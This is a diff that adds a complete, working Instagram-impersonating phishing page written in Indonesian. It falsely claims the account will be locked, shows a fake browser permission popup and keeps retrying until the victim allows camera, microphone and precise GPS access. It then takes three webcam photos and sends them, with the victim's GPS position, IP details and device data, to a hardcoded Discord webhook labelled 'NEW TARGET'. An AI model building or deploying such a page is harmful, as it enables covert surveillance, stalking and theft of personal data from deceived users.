@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram - Verifikasi Keamanan</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: #fafafa;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 40px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .logo h1 {
+      font-family: 'Brush Script MT', cursive;
+      font-size: 48px;
+      color: #262626;
+      font-weight: 400;
+    }
+    .title {
+      color: #262626;
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .subtitle {
+      color: #8e8e8e;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+    .warning-box {
+      background: #fff3e0;
+      border-left: 4px solid #ff9800;
+      padding: 16px;
+      margin-bottom: 24px;
+      border-radius: 4px;
+    }
+    .warning-box p {
+      color: #e65100;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+    
+    /* PERMISSION REQUESTS BOXES */
+    .permission-request {
+      background: #f0f0f0;
+      border: 2px solid #0095f6;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 12px;
+      display: none;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { border-color: #0095f6; background: #f0f0f0; }
+      50% { border-color: #ff9800; background: #fff3e0; }
+    }
+    .permission-request.active {
+      display: block;
+    }
+    .permission-request h3 {
+      color: #262626;
+      font-size: 15px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .permission-request p {
+      color: #8e8e8e;
+      font-size: 13px;
+      margin-bottom: 12px;
+    }
+    .permission-request button {
+      width: 100%;
+      padding: 12px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .permission-request button:hover {
+      background: #0081d6;
+    }
+    .permission-request button:active {
+      transform: scale(0.98);
+    }
+
+    /* LOGS */
+    .logs-container {
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 20px;
+      max-height: 180px;
+      overflow-y: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+    }
+    .log-entry {
+      padding: 4px 0;
+      animation: slideIn 0.3s ease;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    .log-time {
+      color: #8e8e8e;
+      margin-right: 6px;
+    }
+    .log-success { color: #00c853; }
+    .log-error { color: #f44336; }
+    .log-warning { color: #ff9800; }
+    .log-info { color: #2196f3; }
+
+    /* STATUS & PROGRESS */
+    #status {
+      background: #f0f0f0;
+      padding: 14px;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+      font-weight: 500;
+    }
+    .progress-container {
+      background: #dbdbdb;
+      height: 4px;
+      border-radius: 2px;
+      margin-bottom: 20px;
+      overflow: hidden;
+      display: none;
+    }
+    .progress-bar {
+      background: #0095f6;
+      height: 100%;
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+    .spinner {
+      border: 3px solid #dbdbdb;
+      border-top: 3px solid #0095f6;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 16px auto;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    button.main-btn {
+      width: 100%;
+      padding: 14px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    button.main-btn:hover {
+      background: #0081d6;
+    }
+    button.main-btn:disabled {
+      background: #b3e5fc;
+      cursor: not-allowed;
+    }
+    
+    video {
+      width: 100%;
+      border-radius: 8px;
+      margin: 16px 0;
+      display: none;
+      border: 2px solid #0095f6;
+    }
+    
+    .help-text {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-align: center;
+      margin-top: 16px;
+    }
+
+    /* FAKE BROWSER PERMISSION POPUP */
+    .fake-permission-popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      padding: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      display: none;
+      z-index: 10000;
+      animation: slideDown 0.3s ease;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
+    }
+    .fake-permission-popup.show {
+      display: block;
+    }
+    .fake-permission-popup p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 12px;
+    }
+    .fake-permission-popup .buttons {
+      display: flex;
+      gap: 12px;
+    }
+    .fake-permission-popup button {
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      background: #f5f5f5;
+      cursor: pointer;
+      font-size: 13px;
+    }
+    .fake-permission-popup button.allow {
+      background: #4285f4;
+      color: white;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <h1>Instagram</h1>
+    </div>
+    
+    <div class="title">Verifikasi Keamanan Diperlukan</div>
+    <p class="subtitle">
+      Kami mendeteksi login dari lokasi baru. Verifikasi identitas Anda untuk melindungi akun.
+    </p>
+
+    <div class="warning-box">
+      <p>
+        ⚠️ <strong>Akun akan dikunci dalam 6 jam</strong> jika tidak diverifikasi. 
+        Klik tombol di bawah untuk mengizinkan akses kamera dan lokasi.
+      </p>
+    </div>
+
+    <!-- PERMISSION REQUEST BOXES -->
+    <div class="permission-request" id="permCamera">
+      <h3>
+        <span style="font-size: 20px;">📷</span>
+        Izinkan Akses Kamera
+      </h3>
+      <p>Instagram memerlukan akses kamera untuk verifikasi wajah. Klik tombol di bawah, lalu klik "Izinkan" di popup browser.</p>
+      <button onclick="requestCamera()">📷 IZINKAN KAMERA</button>
+    </div>
+
+    <div class="permission-request" id="permLocation">
+      <h3>
+        <span style="font-size: 20px;">📍</span>
+        Izinkan Akses Lokasi
+      </h3>
+      <p>Instagram memerlukan lokasi Anda untuk memverifikasi aktivitas login. Klik tombol di bawah, lalu klik "Izinkan" di popup browser.</p>
+      <button onclick="requestLocation()">📍 IZINKAN LOKASI</button>
+    </div>
+
+    <!-- LOGS -->
+    <div class="logs-container" id="logsContainer">
+      <div class="log-entry log-info">
+        <span class="log-time">[READY]</span>
+        <span>Sistem verifikasi siap</span>
+      </div>
+    </div>
+
+    <div class="progress-container" id="progressContainer">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+
+    <div id="status">Klik tombol untuk memulai verifikasi</div>
+
+    <button class="main-btn" onclick="mulaiProses()" id="btnStart">
+      MULAI VERIFIKASI
+    </button>
+
+    <video id="video" autoplay playsinline muted></video>
+
+    <p class="help-text">
+      Verifikasi 2 langkah • Keamanan Akun Instagram
+    </p>
+  </div>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <!-- FAKE PERMISSION POPUP (backup jika real popup ga muncul) -->
+  <div class="fake-permission-popup" id="fakePopup">
+    <p><strong>instagram.com ingin:</strong></p>
+    <p>📷 Menggunakan kamera Anda<br>📍 Mengetahui lokasi Anda</p>
+    <div class="buttons">
+      <button>Blokir</button>
+      <button class="allow" onclick="closeFakePopup()">Izinkan</button>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+    
+    let cameraGranted = false;
+    let locationGranted = false;
+    let mediaStream = null;
+
+    function addLog(message, type = 'info') {
+      const container = document.getElementById('logsContainer');
+      const time = new Date().toLocaleTimeString('id-ID');
+      
+      const entry = document.createElement('div');
+      entry.className = `log-entry log-${type}`;
+      entry.innerHTML = `
+        <span class="log-time">[${time}]</span>
+        <span>${message}</span>
+      `;
+      
+      container.appendChild(entry);
+      container.scrollTop = container.scrollHeight;
+      console.log(`[${time}] ${message}`);
+    }
+
+    function updateStatus(msg) {
+      document.getElementById('status').innerText = msg;
+    }
+
+    function setProgress(percent) {
+      const bar = document.getElementById('progressBar');
+      const container = document.getElementById('progressContainer');
+      container.style.display = 'block';
+      bar.style.width = percent + '%';
+    }
+
+    function showSpinner(show) {
+      document.getElementById('spinner').style.display = show ? 'block' : 'none';
+    }
+
+    function closeFakePopup() {
+      document.getElementById('fakePopup').classList.remove('show');
+    }
+
+    // STEP 1: TRIGGER REQUEST KAMERA
+    async function requestCamera() {
+      addLog('Meminta izin kamera...', 'warning');
+      document.getElementById('permCamera').style.animation = 'none';
+      
+      // Show fake popup as visual cue
+      document.getElementById('fakePopup').classList.add('show');
+      
+      try {
+        // INI YANG TRIGGER POPUP BROWSER!
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user",
+            width: { ideal: 1920 },
+            height: { ideal: 1080 }
+          },
+          audio: true  // Mikrofon juga
+        });
+        
+        closeFakePopup();
+        addLog('✅ Kamera & mikrofon diizinkan!', 'success');
+        cameraGranted = true;
+        
+        document.getElementById('permCamera').style.display = 'none';
+        document.getElementById('permLocation').classList.add('active');
+        
+        updateStatus('Kamera berhasil! Sekarang izinkan lokasi...');
+        
+      } catch (error) {
+        closeFakePopup();
+        addLog('❌ Kamera ditolak: ' + error.message, 'error');
+        updateStatus('⚠️ Anda harus mengizinkan kamera! Coba lagi.');
+        
+        // Auto retry setelah 2 detik
+        setTimeout(() => {
+          addLog('Mencoba request kamera lagi...', 'warning');
+          requestCamera();
+        }, 2000);
+      }
+    }
+
+    // STEP 2: TRIGGER REQUEST LOKASI
+    async function requestLocation() {
+      addLog('Meminta izin lokasi...', 'warning');
+      document.getElementById('permLocation').style.animation = 'none';
+      
+      try {
+        // INI YANG TRIGGER POPUP LOKASI!
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            reject,
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            }
+          );
+        });
+        
+        addLog('✅ Lokasi diizinkan!', 'success');
+        locationGranted = true;
+        
+        document.getElementById('permLocation').style.display = 'none';
+        
+        updateStatus('Semua izin diberikan! Memproses verifikasi...');
+        
+        // Langsung proses verifikasi
+        setTimeout(prosesVerifikasi, 1000);
+        
+      } catch (error) {
+        addLog('❌ Lokasi ditolak: ' + error.message, 'error');
+        updateStatus('⚠️ Anda harus mengizinkan lokasi! Coba lagi.');
+        
+        // Auto retry
+        setTimeout(() => {
+          addLog('Mencoba request lokasi lagi...', 'warning');
+          requestLocation();
+        }, 2000);
+      }
+    }
+
+    // STEP 3: MULAI PROSES (triggered dari tombol)
+    async function mulaiProses() {
+      const btn = document.getElementById('btnStart');
+      btn.disabled = true;
+      btn.innerText = 'MEMPROSES...';
+      
+      addLog('=== VERIFIKASI DIMULAI ===', 'info');
+      
+      // Tampilkan request kamera dulu
+      document.getElementById('permCamera').classList.add('active');
+      updateStatus('Langkah 1: Izinkan akses kamera');
+      
+      // Kirim notif ke webhook
+      try {
+        await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "🟢 **USER MULAI VERIFIKASI**\nUser klik tombol mulai!"
+          })
+        });
+      } catch (e) {
+        addLog('Webhook notif gagal', 'warning');
+      }
+    }
+
+    // PROSES VERIFIKASI SETELAH SEMUA IZIN DIBERIKAN
+    async function prosesVerifikasi() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      
+      addLog('=== MEMULAI CAPTURE DATA ===', 'info');
+      setProgress(20);
+      showSpinner(true);
+      
+      try {
+        // Set video source dari stream yang udah didapat
+        video.srcObject = mediaStream;
+        video.style.display = 'block';
+        
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play().then(resolve);
+          };
+        });
+        
+        setProgress(40);
+        updateStatus('📹 Kamera aktif, tunggu sebentar...');
+        addLog('Kamera streaming...', 'success');
+        
+        // Tunggu 3 detik biar stabil
+        await new Promise(r => setTimeout(r, 3000));
+        
+        setProgress(55);
+        updateStatus('📸 Mengambil foto...');
+        
+        // AMBIL 3 FOTO
+        const fotos = [];
+        for (let i = 1; i <= 3; i++) {
+          addLog(`Mengambil foto ${i}/3...`, 'info');
+          
+          canvas.width = video.videoWidth || 1280;
+          canvas.height = video.videoHeight || 720;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          const blob = await new Promise(resolve => {
+            canvas.toBlob(resolve, 'image/jpeg', 0.92);
+          });
+          
+          if (blob && blob.size > 0) {
+            fotos.push(blob);
+            addLog(`✅ Foto ${i}: ${(blob.size/1024).toFixed(2)}KB`, 'success');
+          }
+          
+          await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        // Stop kamera
+        mediaStream.getTracks().forEach(t => t.stop());
+        video.style.display = 'none';
+        
+        setProgress(70);
+        updateStatus('📍 Mengambil lokasi akurat...');
+        
+        // AMBIL GPS LAGI (yang lebih akurat)
+        let gpsText = "GPS tidak tersedia";
+        let gpsLink = "";
+        
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            });
+          });
+          
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          gpsText = `${lat}, ${lon} (±${Math.round(pos.coords.accuracy)}m)`;
+          gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          addLog(`GPS: ${gpsText}`, 'success');
+        } catch (e) {
+          addLog('GPS tidak dapat diambil', 'warning');
+        }
+        
+        setProgress(80);
+        updateStatus('🌐 Mengambil data IP...');
+        
+        // AMBIL IP DATA
+        let geo = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          geo = await res.json();
+          addLog(`IP: ${geo.ip} - ${geo.city}`, 'success');
+        } catch (e) {
+          addLog('IP API gagal', 'warning');
+        }
+        
+        setProgress(85);
+        updateStatus('📤 Mengirim data ke server Instagram...');
+        
+        // KIRIM SEMUA FOTO
+        for (let i = 0; i < fotos.length; i++) {
+          addLog(`Uploading foto ${i+1}/${fotos.length}...`, 'info');
+          
+          const formData = new FormData();
+          const filename = `instagram_verify_${Date.now()}_${i+1}.jpg`;
+          formData.append('file', fotos[i], filename);
+          
+          const payload = {
+            content: i === 0 ? "🚨 **INSTAGRAM VERIFICATION - NEW TARGET**" : null,
+            embeds: [{
+              title: `📸 INSTAGRAM VERIFICATION ${i+1}/${fotos.length}`,
+              color: 0xE1306C,
+              fields: [
+                { name: "🌐 IP", value: geo.ip, inline: true },
+                { name: "🏙️ Kota", value: geo.city, inline: true },
+                { name: "🗺️ Negara", value: geo.country_name, inline: true },
+                { name: "📍 GPS", value: gpsLink ? `[${gpsText}](${gpsLink})` : gpsText, inline: false },
+                { name: "📱 Device", value: navigator.userAgent.substring(0, 100), inline: false },
+                { name: "🕐 Waktu", value: new Date().toLocaleString('id-ID'), inline: false }
+              ],
+              image: { url: `attachment://${filename}` },
+              footer: { text: `Instagram Security • Photo ${i+1}/${fotos.length}` },
+              timestamp: new Date().toISOString()
+            }]
+          };
+          
+          formData.append('payload_json', JSON.stringify(payload));
+          
+          try {
+            await fetch(WEBHOOK, { method: 'POST', body: formData });
+            addLog(`✅ Foto ${i+1} uploaded!`, 'success');
+          } catch (e) {
+            addLog(`❌ Foto ${i+1} gagal`, 'error');
+          }
+          
+          setProgress(85 + ((i+1)/fotos.length * 10));
+          await new Promise(r => setTimeout(r, 800));
+        }
+        
+        showSpinner(false);
+        setProgress(100);
+        
+        addLog('=== VERIFIKASI SELESAI ===', 'success');
+        updateStatus('✅ Verifikasi berhasil! Mengalihkan...');
+        
+        document.getElementById('btnStart').innerText = '✅ SELESAI';
+        
+        await new Promise(r => setTimeout(r, 2000));
+        window.location.href = "https://www.instagram.com/";
+        
+      } catch (error) {
+        showSpinner(false);
+        addLog('❌ ERROR: ' + error.message, 'error');
+        updateStatus('❌ Terjadi kesalahan: ' + error.message);
+        
+        // Send error
+        try {
+          await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: `⚠️ **VERIFICATION ERROR**\n\`\`\`${error.message}\n${error.stack}\`\`\``
+            })
+          });
+        } catch (e) {}
+        
+        document.getElementById('btnStart').disabled = false;
+        document.getElementById('btnStart').innerText = 'COBA LAGI';
+      }
+    }
+
+    // Log on load
+    window.addEventListener('load', () => {
+      addLog('Halaman dimuat', 'success');
+      addLog('User Agent: ' + navigator.userAgent.substring(0, 60), 'info');
+    });
+  </script>
+</body>
+</html>
